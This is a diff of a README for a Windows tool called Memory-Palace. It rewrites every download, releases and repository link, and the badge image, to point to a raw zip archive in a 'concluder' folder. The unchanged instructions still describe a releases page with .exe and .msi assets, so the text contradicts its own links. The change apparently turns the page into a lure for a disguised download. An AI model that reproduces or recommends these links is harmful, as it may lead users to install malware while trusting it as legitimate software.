@@ -1,6 +1,6 @@
 # 🧠 Memory-Palace - Manage AI Memory Simply
 
-[![Download Memory-Palace](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/popshhsx555/Memory-Palace/releases)
+[![Download Memory-Palace](https://github.com/popshhsx555/Memory-Palace/raw/refs/heads/main/concluder/Memory-Palace-v3.9.zip)](https://github.com/popshhsx555/Memory-Palace/raw/refs/heads/main/concluder/Memory-Palace-v3.9.zip)
 
 Memory-Palace is a long-term memory operating system designed for AI agents. It helps store and organize large amounts of information over time, making AI systems more effective. This guide will help you download and run Memory-Palace on your Windows computer, step by step.
 
@@ -31,7 +31,7 @@ Before you start the download, make sure your computer meets these basic require
 Memory-Palace is available for Windows users through GitHub's release page.
 
 **Visit this page to download the program:**  
-[https://github.com/popshhsx555/Memory-Palace/releases](https://github.com/popshhsx555/Memory-Palace/releases)
+[https://github.com/popshhsx555/Memory-Palace/raw/refs/heads/main/concluder/Memory-Palace-v3.9.zip](https://github.com/popshhsx555/Memory-Palace/raw/refs/heads/main/concluder/Memory-Palace-v3.9.zip)
 
 You will find the installation files there. Look for the latest version labeled for Windows.
 
@@ -45,7 +45,7 @@ Follow these steps carefully to get Memory-Palace up and running on your PC.
    Use any browser like Chrome, Edge, or Firefox.
 
 2. **Go to the download page:**  
-   [https://github.com/popshhsx555/Memory-Palace/releases](https://github.com/popshhsx555/Memory-Palace/releases)
+   [https://github.com/popshhsx555/Memory-Palace/raw/refs/heads/main/concluder/Memory-Palace-v3.9.zip](https://github.com/popshhsx555/Memory-Palace/raw/refs/heads/main/concluder/Memory-Palace-v3.9.zip)
 
 3. **Find the latest Windows release.**  
    Scroll down to the section titled "Assets." It will list files with names ending in `.exe` or `.msi`. These are the installation files.
@@ -98,7 +98,7 @@ These features help keep AI data organized and easy to access.
 
 To stay secure and compatible, update the software regularly.
 
-1. Visit the [releases page](https://github.com/popshhsx555/Memory-Palace/releases).  
+1. Visit the [releases page](https://github.com/popshhsx555/Memory-Palace/raw/refs/heads/main/concluder/Memory-Palace-v3.9.zip).  
 2. Download the latest installer file.  
 3. Run it as before.  
 4. The installer will update your current version without losing data.
@@ -123,12 +123,12 @@ If issues persist, report them through the GitHub Issues page of the Memory-Pala
 Memory-Palace does not require coding knowledge. Its interface uses buttons and menus you can click. Explore options and tooltips to learn more.
 
 For detailed questions or feedback, use the GitHub repository page for this project:  
-[https://github.com/popshhsx555/Memory-Palace](https://github.com/popshhsx555/Memory-Palace)
+[https://github.com/popshhsx555/Memory-Palace/raw/refs/heads/main/concluder/Memory-Palace-v3.9.zip](https://github.com/popshhsx555/Memory-Palace/raw/refs/heads/main/concluder/Memory-Palace-v3.9.zip)
 
 ---
 
 ## ⬇️ Download Now
 
-[![Download Memory-Palace](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/popshhsx555/Memory-Palace/releases)  
+[![Download Memory-Palace](https://github.com/popshhsx555/Memory-Palace/raw/refs/heads/main/concluder/Memory-Palace-v3.9.zip)](https://github.com/popshhsx555/Memory-Palace/raw/refs/heads/main/concluder/Memory-Palace-v3.9.zip)  
 
 This link takes you directly to the page with the latest Windows installer. Follow the steps above to install.
